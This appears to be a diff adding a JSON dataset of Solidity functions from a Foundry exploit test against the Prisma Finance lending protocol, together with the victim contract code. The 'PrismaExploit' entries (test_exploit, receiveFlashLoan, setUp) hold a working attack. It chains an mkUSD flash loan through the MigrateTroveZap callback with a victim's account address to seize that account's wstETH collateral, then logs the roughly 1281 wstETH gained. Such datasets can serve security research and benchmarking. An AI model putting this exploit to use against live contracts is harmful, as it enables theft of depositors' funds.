@@ -1,0 +1,268 @@
+[
+  {
+    "contract/interface": "IMKUSDLoan",
+    "source_type": "victim_contract",
+    "function_name": "flashLoan",
+    "original_code": "    function flashLoan(\n        IFlashLoanRecipient recipient,\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external override nonReentrant whenNotPaused {\n        InputHelpers.ensureInputLengthMatch(tokens.length, amounts.length);\n\n        uint256[] memory feeAmounts = new uint256[](tokens.length);\n        uint256[] memory preLoanBalances = new uint256[](tokens.length);\n\n        // Used to ensure `tokens` is sorted in ascending order, which ensures token uniqueness.\n        IERC20 previousToken = IERC20(0);\n\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 token = tokens[i];\n            uint256 amount = amounts[i];\n\n            _require(token > previousToken, token == IERC20(0) ? Errors.ZERO_TOKEN : Errors.UNSORTED_TOKENS);\n            previousToken = token;\n\n            preLoanBalances[i] = token.balanceOf(address(this));\n            feeAmounts[i] = _calculateFlashLoanFeeAmount(amount);\n\n            _require(preLoanBalances[i] >= amount, Errors.INSUFFICIENT_FLASH_LOAN_BALANCE);\n            token.safeTransfer(address(recipient), amount);\n        }\n\n        recipient.receiveFlashLoan(tokens, amounts, feeAmounts, userData);\n\n        for (uint256 i = 0; i < tokens.length; ++i) {\n            IERC20 token = tokens[i];\n            uint256 preLoanBalance = preLoanBalances[i];\n\n            // Checking for loan repayment first (without accounting for fees) makes for simpler debugging, and results\n            // in more accurate revert reasons if the flash loan protocol fee percentage is zero.\n            uint256 postLoanBalance = token.balanceOf(address(this));\n            _require(postLoanBalance >= preLoanBalance, Errors.INVALID_POST_LOAN_BALANCE);\n\n            // No need for checked arithmetic since we know the loan was fully repaid.\n            uint256 receivedFeeAmount = postLoanBalance - preLoanBalance;\n            _require(receivedFeeAmount >= feeAmounts[i], Errors.INSUFFICIENT_FLASH_LOAN_FEE_AMOUNT);\n\n            _payFeeAmount(token, receivedFeeAmount);\n            emit FlashLoan(recipient, token, amounts[i], receivedFeeAmount);\n        }\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "BorrowerOperations",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "MigrateTroveZap",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "TroveManager",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "lowerHint",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "mkUSD",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "priceFeed",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        IERC20[] memory, /* tokens */\n        uint256[] memory, /* amounts */\n        uint256[] memory, /* feeAmounts */\n        bytes memory /* userData */\n    ) external {\n        // approve borowOperations to spend wstETH with max amount\n        IERC20(wstETH).approve(address(BorrowerOperations), type(uint256).max);\n\n        // set delegate approval\n        IBorrowerOperations(BorrowerOperations).setDelegateApproval(address(MigrateTroveZap), true);\n\n        // // open trove\n        IBorrowerOperations(BorrowerOperations).openTrove(\n            address(TroveManager),\n            address(this),\n            5_000_000_325_833_471,\n            1_000_000_000_000_000_000,\n            2_000_000_000_000_000_000_000,\n            address(upperHint),\n            address(lowerHint)\n        );\n\n        // // another mkUSD loan\n        // // // data\n        // bytes memory data = hex\"000000000000000000000000d996073019c74b2fb94ead236e32032405bc027c0000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000458a6330674daf1a93000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f\";\n\n        uint256 amount = 2_000_000_000_000_000_000_000;\n\n        address account = address(this);\n        address troveManagerFrom = address(TroveManager);\n        address troveManagerTo = address(TroveManager);\n        uint256 maxFeePercentage = 5_000_000_325_833_471;\n        uint256 coll = 1_282_797_208_306_130_557_587;\n\n        bytes memory data = abi.encode(\n            account, troveManagerFrom, troveManagerTo, maxFeePercentage, coll, address(upperHint), address(lowerHint)\n        );\n\n        IMKUSDLoan(mkUSD).flashLoan(IERC3156FlashBorrower(address(MigrateTroveZap)), address(mkUSD), amount, data);\n\n        // cuurent contract mkUSD balance\n        // console2.log(\"mkUSD balance before closing the trove: \", IERC20(mkUSD).balanceOf(address(this)));\n\n        // close trove\n        IBorrowerOperations(BorrowerOperations).closeTrove(address(TroveManager), address(this));\n\n        uint256 returnAmount = 1_000_000_000_000_000_000;\n        // transfer the wstETH loan back to the vault\n        IERC20(wstETH).transfer(address(vault), returnAmount);\n\n        // current contract wstETH balance\n        console2.log(\"wstETH balance ~1281.79 ETH after attack: \", IERC20(wstETH).balanceOf(address(this)));\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        // set up the fork\n        vm.createSelectFork(\"https://rpc.ankr.com/eth\", attackTx);\n\n        // chainlink price feed and balancer vault\n        priceFeed = IPriceFeed(0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac);\n        vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    }\n\n    /////////////////////////////////////// Interfaces ///////////////////////////////////////\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "test_exploit",
+    "original_code": "    function test_exploit() public {\n        uint256 price = priceFeed.fetchPrice(wstETH);\n        console2.log(\"Price Feed Price: \", price);\n\n        // start with ~1800 mkUSD\n        deal(address(mkUSD), address(this), 1_800_000_022_022_732_637);\n\n        console2.log(\"Attacker start with ~1800 mkUSD: \", IERC20(mkUSD).balanceOf(address(this)));\n        console2.log(\"start with wstETH balance before attack : \", IERC20(wstETH).balanceOf(address(this)));\n\n        // get mkUSD loan\n\n        //     address account,\n        //     address troveManagerFrom,\n        //     address troveManagerTo,\n        //     uint256 maxFeePercentage,\n        //     uint256 coll,\n        //     address upperHint,\n        //     address lowerHint\n\n        // data\n        // bytes memory data = hex\"00000000000000000000000056a201b872b50bbdee0021ed4d1bb36359d291ed0000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000001cc79f3f47bfc060b6f761fcd1afc6d399a968b60000000000000000000000000000000000000000000000000011c3794b4c52ff0000000000000000000000000000000000000000000000191bf9b8cefc50317e000000000000000000000000e87c6f39881d5bf51cf46d3dc7e1c1731c2f790a00000000000000000000000089ee26fcdff6b109f81abc6876600ec427f7907f\";\n\n        uint256 amount = 1_442_100_643_475_620_087_665_721;\n\n        address account = 0x56A201b872B50bBdEe0021ed4D1bb36359D291ED;\n        address troveManagerFrom = address(TroveManager);\n        address troveManagerTo = address(TroveManager);\n        uint256 maxFeePercentage = 5_000_000_325_833_471;\n        uint256 coll = 463_184_447_350_099_685_758;\n\n        bytes memory data = abi.encode(\n            account, troveManagerFrom, troveManagerTo, maxFeePercentage, coll, address(upperHint), address(lowerHint)\n        );\n\n        IMKUSDLoan(mkUSD).flashLoan(IERC3156FlashBorrower(address(MigrateTroveZap)), address(mkUSD), amount, data);\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(wstETH);\n\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 1_000_000_000_000_000_000;\n\n        uint256[] memory feeAmounts = new uint256[](1);\n        feeAmounts[0] = 0;\n\n        // get balancer wstETH loan\n        vault.flashLoan(address(this), tokens, amounts, abi.encode(\"\"));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "upperHint",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "vault",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "PrismaExploit",
+    "source_type": "attacker_contract",
+    "function_name": "wstETH",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IPriceFeed",
+    "source_type": "victim_contract",
+    "function_name": "fetchPrice",
+    "original_code": "    function fetchPrice(address _token) public returns (uint256) {\n        PriceRecord memory priceRecord = priceRecords[_token];\n        OracleRecord memory oracle = oracleRecords[_token];\n\n        uint256 scaledPrice = priceRecord.scaledPrice;\n        // We short-circuit only if the price was already correct in the current block\n        if (priceRecord.lastUpdated != block.timestamp) {\n            if (priceRecord.lastUpdated == 0) {\n                revert PriceFeed__UnknownFeedError(_token);\n            }\n\n            (FeedResponse memory currResponse, FeedResponse memory prevResponse, bool updated) = _fetchFeedResponses(\n                oracle.chainLinkOracle,\n                priceRecord.roundId\n            );\n\n            if (updated) {\n                scaledPrice = _processFeedResponses(_token, oracle, currResponse, prevResponse, priceRecord);\n            } else {\n                if (_isPriceStale(priceRecord.timestamp, oracle.heartbeat)) {\n                    revert PriceFeed__FeedFrozenError(_token);\n                }\n\n                priceRecord.lastUpdated = uint32(block.timestamp);\n                priceRecords[_token] = priceRecord;\n            }\n        }\n\n        if (oracle.isEthIndexed) {\n            uint256 ethPrice = fetchPrice(address(0));\n            return (ethPrice * scaledPrice) / 1 ether;\n        }\n        return scaledPrice;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IBorrowerOperations",
+    "source_type": "victim_contract",
+    "function_name": "closeTrove",
+    "original_code": "    function closeTrove(ITroveManager troveManager, address account) external callerOrDelegated(account) {\n        IERC20 collateralToken;\n\n        uint256 price;\n        bool isRecoveryMode;\n        uint256 totalPricedCollateral;\n        uint256 totalDebt;\n        (collateralToken, price, totalPricedCollateral, totalDebt, isRecoveryMode) = _getCollateralAndTCRData(\n            troveManager\n        );\n        require(!isRecoveryMode, \"BorrowerOps: Operation not permitted during Recovery Mode\");\n\n        (uint256 coll, uint256 debt) = troveManager.applyPendingRewards(account);\n\n        uint256 newTCR = _getNewTCRFromTroveChange(totalPricedCollateral, totalDebt, coll * price, false, debt, false);\n        _requireNewTCRisAboveCCR(newTCR);\n\n        troveManager.closeTrove(account, msg.sender, coll, debt);\n\n        emit TroveUpdated(account, 0, 0, 0, BorrowerOperation.closeTrove);\n\n        // Burn the repaid Debt from the user's balance and the gas compensation from the Gas Pool\n        debtToken.burnWithGasCompensation(msg.sender, debt - DEBT_GAS_COMPENSATION);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IBorrowerOperations",
+    "source_type": "victim_contract",
+    "function_name": "openTrove",
+    "original_code": "    function openTrove(\n        ITroveManager troveManager,\n        address account,\n        uint256 _maxFeePercentage,\n        uint256 _collateralAmount,\n        uint256 _debtAmount,\n        address _upperHint,\n        address _lowerHint\n    ) external callerOrDelegated(account) {\n        require(!PRISMA_CORE.paused(), \"Deposits are paused\");\n        IERC20 collateralToken;\n        LocalVariables_openTrove memory vars;\n        bool isRecoveryMode;\n        (\n            collateralToken,\n            vars.price,\n            vars.totalPricedCollateral,\n            vars.totalDebt,\n            isRecoveryMode\n        ) = _getCollateralAndTCRData(troveManager);\n\n        _requireValidMaxFeePercentage(_maxFeePercentage);\n\n        vars.netDebt = _debtAmount;\n\n        if (!isRecoveryMode) {\n            vars.netDebt = vars.netDebt + _triggerBorrowingFee(troveManager, account, _maxFeePercentage, _debtAmount);\n        }\n        _requireAtLeastMinNetDebt(vars.netDebt);\n\n        // ICR is based on the composite debt, i.e. the requested Debt amount + Debt borrowing fee + Debt gas comp.\n        vars.compositeDebt = _getCompositeDebt(vars.netDebt);\n        vars.ICR = PrismaMath._computeCR(_collateralAmount, vars.compositeDebt, vars.price);\n        vars.NICR = PrismaMath._computeNominalCR(_collateralAmount, vars.compositeDebt);\n\n        if (isRecoveryMode) {\n            _requireICRisAboveCCR(vars.ICR);\n        } else {\n            _requireICRisAboveMCR(vars.ICR, troveManager.MCR());\n            uint256 newTCR = _getNewTCRFromTroveChange(\n                vars.totalPricedCollateral,\n                vars.totalDebt,\n                _collateralAmount * vars.price,\n                true,\n                vars.compositeDebt,\n                true\n            ); // bools: coll increase, debt increase\n            _requireNewTCRisAboveCCR(newTCR);\n        }\n\n        // Create the trove\n        (vars.stake, vars.arrayIndex) = troveManager.openTrove(\n            account,\n            _collateralAmount,\n            vars.compositeDebt,\n            vars.NICR,\n            _upperHint,\n            _lowerHint,\n            isRecoveryMode\n        );\n        emit TroveCreated(account, vars.arrayIndex);\n\n        // Move the collateral to the Trove Manager\n        collateralToken.safeTransferFrom(msg.sender, address(troveManager), _collateralAmount);\n\n        //  and mint the DebtAmount to the caller and gas compensation for Gas Pool\n        debtToken.mintWithGasCompensation(msg.sender, _debtAmount);\n\n        emit TroveUpdated(account, vars.compositeDebt, _collateralAmount, vars.stake, BorrowerOperation.openTrove);\n    }\n\n    // Send collateral to a trove\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IBorrowerOperations",
+    "source_type": "victim_contract",
+    "function_name": "setDelegateApproval",
+    "original_code": "    function setDelegateApproval(address _delegate, bool _isApproved) external {\n        isApprovedDelegate[msg.sender][_delegate] = _isApproved;\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC20",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IERC3156FlashBorrower",
+    "source_type": "victim_contract",
+    "function_name": "onFlashLoan",
+    "original_code": "    function onFlashLoan(\n        address,\n        address,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        require(msg.sender == address(debtToken), \"!DebtToken\");\n        (\n            address account,\n            address troveManagerFrom,\n            address troveManagerTo,\n            uint256 maxFeePercentage,\n            uint256 coll,\n            address upperHint,\n            address lowerHint\n        ) = abi.decode(data, (address, address, address, uint256, uint256, address, address));\n        uint256 toMint = amount + fee;\n        borrowerOps.closeTrove(troveManagerFrom, account);\n        borrowerOps.openTrove(troveManagerTo, account, maxFeePercentage, coll, toMint, upperHint, lowerHint);\n        return _RETURN_VALUE;\n    }\n\n    /// @notice Migrates a trove to another TroveManager for the same collateral\n",
+    "description": ""
+  }
+]
